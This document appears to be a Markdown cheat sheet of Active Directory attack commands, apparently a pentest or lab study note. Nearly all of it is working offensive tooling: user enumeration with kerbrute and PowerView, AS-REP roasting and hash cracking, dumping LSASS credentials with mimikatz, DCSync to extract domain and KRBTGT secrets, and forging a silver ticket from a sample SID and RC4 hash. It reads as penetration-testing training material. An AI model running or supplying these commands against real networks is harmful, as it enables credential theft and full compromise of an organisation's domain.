## 🔺 Check if domain joined
```
systeminfo | findstr /B /C:"Domain"
# If it returns a domain name, the machine is domain-joined.
# If it returns WORKGROUP, it's not part of a domain.
```


## 🔺 Powerview
```
# Users
Get-NetUser | select samaccountname
Get-NetUser | select samaccountname, memberof, serviceprincipalname
# DC IP
Get-NetDomainController -Domain domain.com

# Who is domain admin
Get-DomainGroupMember "Domain Admins" -Recurse

# You can use CME to get hostname <-> IP 
```

## 🔺 Kerberos User enumeration
```
test if user names are validate:
kerbrute userenum -d relia.com --dc 172.16.143.6 users.txt 
```

## 🔺 LDAP Enumeration
```
ldapseasrch
```



## 🔺 AS-REP Roasting (NO Pre-Auth)
> Crack with hashcat a.hash /usr/share/wordlists/rockyou.txt -m 18200
```
GetNPUsers.py relia.com/ -usersfile users.txt -no-pass -dc-ip 172.16.143.6
```


## 🔺  DC Sync
 ### Step 1: Compromise Local Administrator on a Workstation
 
 ### Step 2: Check If any user Has Replication Privileges (sync)
```
Get-ObjectACL -DistinguishedName "DC=yourdomain,DC=com" -ResolveGUIDs | ? {($_.ObjectType -match 'replication') -and ($_.ActiveDirectoryRights -match 'GenericAll|WriteDACL|WriteOwner')}
```
### Step 3: Dump LSASS for Cached Credentials of domain admin
```
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit
```

### Step 4: Use credentials of Domain Admin to dump credentials
Why would you do this?
> Your Domain Admin might not be the only highly privileged user. There might be Enterprise Admins, Service Accounts, or other Domain Admins with different access levels.
> Using DCSync, you can dump KRBTGT to create golden ticket (end game)
``` 
mimikatz.exe "lsadump::dcsync /domain:yourdomain.local /user:DomainAdmin"

```


## 🔺  Silver Ticket
- Require ((`Service Account password` OR `NTLM hash`)), ((`Domain SID`)) & ((`Target SPN`))
- Result -> Forged Service ticket AKA Silver Ticket
- If SPN used on multiple servers, Silver Ticket can be used on all of them.

#### To get the domain SID we can do whoami /user
```corp\jeff S-1-5-21-1987370270-658905905-1781884369-1105```

#### to get the SPN we can enumerate SPN using impacket-GetUserSPNs.


### Forge TGS (Silver Ticket)
With all of this info, we can forge a TGS (silver ticket) as follows within mimikatz

```
kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:5d28cf5252d32971419580a51484ca09 /user:geffadmin
```
